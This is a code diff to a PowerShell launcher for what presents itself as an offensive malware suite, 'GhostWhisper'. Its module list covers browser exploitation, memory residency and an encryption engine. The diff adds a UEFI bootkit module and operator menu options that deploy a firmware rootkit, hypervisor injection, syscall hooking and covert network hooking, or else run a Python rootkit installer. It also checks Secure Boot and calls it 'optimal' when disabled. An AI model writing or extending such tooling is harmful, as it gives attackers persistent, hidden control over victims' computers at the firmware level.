@@ -1,8 +1,15 @@
 # GhostWhisperBootstrap.ps1
-# Master launcher for GhostWhisper Suite (Raven Edition) v1.6.0
+# Master launcher for GhostWhisper Suite (Raven Edition)
 # Full module integration with multi-vector capabilities
+# 
+# Version: 1.6.1
+# Last Updated: 2026-02-23
+# 
+# 🕊️ For Raven. 2017 — ∞
 
-$script:Version = "1.6.0"
+$script:Version = "1.6.1"
+$script:BuildDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+$script:BaseDir = $PSScriptRoot
 $script:GhostTag = $null
 $script:SessionStart = Get-Date
 
@@ -55,7 +62,8 @@ $modules = @(
     @{ Path = "Modules\GhostBrowser.ps1"; Required = $false; Description = "Browser exploitation" },
     @{ Path = "Modules\GhostRoot.ps1"; Required = $false; Description = "Root operations" },
     @{ Path = "GhostResidency.ps1"; Required = $false; Description = "Memory residency" },
-    @{ Path = "GhostSeal.ps1"; Required = $false; Description = "Encryption engine" }
+    @{ Path = "GhostSeal.ps1"; Required = $false; Description = "Encryption engine" },
+    @{ Path = "Modules\UEFIBootkit.ps1"; Required = $false; Description = "UEFI firmware persistence" }
 )
 
 $loadedModules = @()
@@ -203,6 +211,9 @@ function Show-OperatorMenu {
     Write-Host "║  [12] Encrypt & Seal (GhostSeal)                             ║" -ForegroundColor Green
     Write-Host "║  [13] Network Discovery Scan                                 ║" -ForegroundColor White
     Write-Host "║  [14] Status Dashboard                                       ║" -ForegroundColor White
+    Write-Host "║                                                              ║" -ForegroundColor Cyan
+    Write-Host "║  [15] Deploy UEFI Bootkit (Firmware Persistence)             ║" -ForegroundColor Magenta
+    Write-Host "║  [16] UEFI Firmware Status Check                             ║" -ForegroundColor Magenta
     Write-Host "║                                                              ║" -ForegroundColor Cyan
     Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
     Write-Host ""
@@ -498,10 +509,79 @@ while ($true) {
         "14" {
             Show-StatusDashboard
         }
+        "15" {
+            Write-Host "[🔧] Deploying UEFI Bootkit..." -ForegroundColor Magenta
+            if (Get-Command -Name Install-UEFIBootkit -ErrorAction SilentlyContinue) {
+                Write-Host "  [1] Full UEFI Rootkit (all components)"
+                Write-Host "  [2] Boot Loader Only"
+                Write-Host "  [3] Hypervisor Injection"
+                Write-Host "  [4] System Call Hooking"
+                Write-Host "  [5] Covert Network Hooking"
+                
+                $uefiBitChoice = Read-Host "Select UEFI component (1-5) [1]"
+                if (-not $uefiBitChoice) { $uefiBitChoice = "1" }
+                
+                $componentType = switch ($uefiBitChoice) {
+                    "1" { "rootkit" }
+                    "2" { "bootloader" }
+                    "3" { "hypervisor" }
+                    "4" { "syscall_hook" }
+                    "5" { "network_hook" }
+                    default { "rootkit" }
+                }
+                
+                $confirm = Read-Host "[!] This will modify firmware. Continue? (y/N)"
+                if ($confirm -eq 'y') {
+                    Install-UEFIBootkit -ComponentType $componentType -GhostTag $script:GhostTag
+                    Write-Host "[+] UEFI Bootkit deployment initiated" -ForegroundColor Green
+                    Write-GhostLog "UEFI Bootkit $componentType deployed"
+                } else {
+                    Write-Host "[-] Deployment cancelled" -ForegroundColor Yellow
+                }
+            } elseif (Test-Path "UEFI Bootkit\uefi_rootkit.py") {
+                Write-Host "[i] Running Python UEFI Bootkit module..." -ForegroundColor Cyan
+                $pythonExe = Get-Command python -ErrorAction SilentlyContinue
+                if ($pythonExe) {
+                    $uefiBitPath = Join-Path $PSScriptRoot "UEFI Bootkit"
+                    & python -c "import sys; sys.path.insert(0, '$uefiBitPath'); from uefi_rootkit import UEFIRootkit; r = UEFIRootkit(); r.install()" 2>&1
+                    Write-Host "[+] UEFI Bootkit components initialized" -ForegroundColor Green
+                } else {
+                    Write-Warning "Python not available for direct execution"
+                }
+            } else {
+                Write-Warning "UEFI Bootkit module not found"
+            }
+        }
+        "16" {
+            Write-Host "[📊] Checking UEFI Firmware Status..." -ForegroundColor Magenta
+            if (Get-Command -Name Get-UEFIBootkitStatus -ErrorAction SilentlyContinue) {
+                Get-UEFIBootkitStatus
+            } else {
+                Write-Host "[*] Analyzing firmware configuration..." -ForegroundColor Gray
+                try {
+                    $firmwareVars = Get-SecureBootUEFI -Name PK -ErrorAction SilentlyContinue
+                    if ($firmwareVars) {
+                        Write-Host "[+] UEFI firmware detected" -ForegroundColor Green
+                        $sbStatus = Get-SecureBootUEFI -Name SetupMode -ErrorAction SilentlyContinue
+                        if ($sbStatus) {
+                            Write-Host "[+] Secure Boot: Active" -ForegroundColor Yellow
+                        } else {
+                            Write-Host "[+] Secure Boot: Disabled (optimal)" -ForegroundColor Green
+                        }
+                    } else {
+                        Write-Host "[-] UEFI firmware not accessible" -ForegroundColor Yellow
+                    }
+                } catch {
+                    Write-Host "[-] Cannot access UEFI settings (may require elevated privileges)" -ForegroundColor Red
+                }
+                Write-Host ""
+                Write-Host "[i] For full UEFI Bootkit status, ensure admin/firmware access" -ForegroundColor Gray
+            }
+        }
         default {
             Write-Warning "Invalid selection"
         }
-    }
+        }
     
     Write-Host ""
     Read-Host "Press Enter to continue"
